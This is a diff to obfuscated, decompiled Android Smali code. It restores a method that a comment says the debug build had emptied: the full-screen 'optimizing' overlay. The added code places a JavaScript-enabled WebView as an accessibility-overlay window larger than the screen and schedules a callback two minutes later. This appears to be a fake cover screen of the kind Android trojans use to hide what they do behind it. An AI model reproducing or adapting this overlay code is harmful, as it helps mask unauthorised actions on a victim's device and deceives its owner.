@@ -9257,9 +9257,139 @@
 .end method
 
 .method public static ٽ(Landroid/content/Context;)V
-    .locals 1
+    .locals 13
 
-    # 调试版：不显示“优化中”全屏遮罩（清空方法体，调用点不动）
+    :try_start_0
+    invoke-static {}, Lڗًقڔ/؋;->ؿ()V
+
+    new-instance v6, Landroid/webkit/WebView;
+
+    invoke-direct {v6, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v6}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v0
+
+    const/4 v1, 0x1
+
+    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+
+    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
+
+    const v0, -0xe0e0e1
+
+    invoke-virtual {v6, v0}, Landroid/webkit/WebView;->setBackgroundColor(I)V
+
+    invoke-static {p0}, Lڗًقڔ/؋;->ل(Landroid/content/Context;)Ljava/lang/String;
+
+    move-result-object v2
+
+    const/4 v1, 0x0
+
+    const-string v3, "text/html"
+
+    const-string v4, "utf-8"
+
+    const/4 v5, 0x0
+
+    move-object v0, v6
+
+    invoke-virtual/range {v0 .. v5}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    sput-object v6, Lڗًقڔ/؋;->؋:Landroid/webkit/WebView;
+
+    const-string v0, "window"
+
+    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object p0
+
+    check-cast p0, Landroid/view/WindowManager;
+
+    sput-object p0, Lڗًقڔ/؋;->ؠ:Landroid/view/WindowManager;
+
+    invoke-interface {p0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;
+
+    move-result-object v0
+
+    new-instance v1, Landroid/graphics/Point;
+
+    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V
+
+    invoke-virtual {v0, v1}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V
+
+    iget v8, v1, Landroid/graphics/Point;->x:I
+
+    iget v0, v1, Landroid/graphics/Point;->y:I
+
+    add-int/lit16 v9, v0, 0xc8
+
+    const/16 v10, 0x7f0
+
+    new-instance v0, Landroid/view/WindowManager$LayoutParams;
+
+    const/16 v11, 0x118
+
+    const/4 v12, -0x3
+
+    move-object v7, v0
+
+    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V
+
+    const v1, 0x800033
+
+    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I
+
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1c
+
+    if-lt v1, v2, :cond_0
+
+    invoke-static {v0}, Landroidx/core/view/accessibility/؋;->ت(Landroid/view/WindowManager$LayoutParams;)V
+
+    :cond_0
+    invoke-interface {p0, v6, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+
+    sget-object p0, Lڗًقڔ/؋;->ء:Landroid/os/Handler;
+
+    if-eqz p0, :cond_1
+
+    const/4 v0, 0x0
+
+    invoke-virtual {p0, v0}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V
+
+    :cond_1
+    new-instance p0, Landroid/os/Handler;
+
+    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
+
+    move-result-object v0
+
+    invoke-direct {p0, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
+
+    sput-object p0, Lڗًقڔ/؋;->ء:Landroid/os/Handler;
+
+    new-instance v0, Lڝږ؁ڋ/ا;
+
+    const/16 v1, 0xa
+
+    invoke-direct {v0, v1}, Lڝږ؁ڋ/ا;-><init>(I)V
+
+    const-wide/32 v1, 0x1d4c0
+
+    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_0
+
+    :catch_0
+    move-exception p0
+
+    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V
+
+    :goto_0
     return-void
 .end method
 
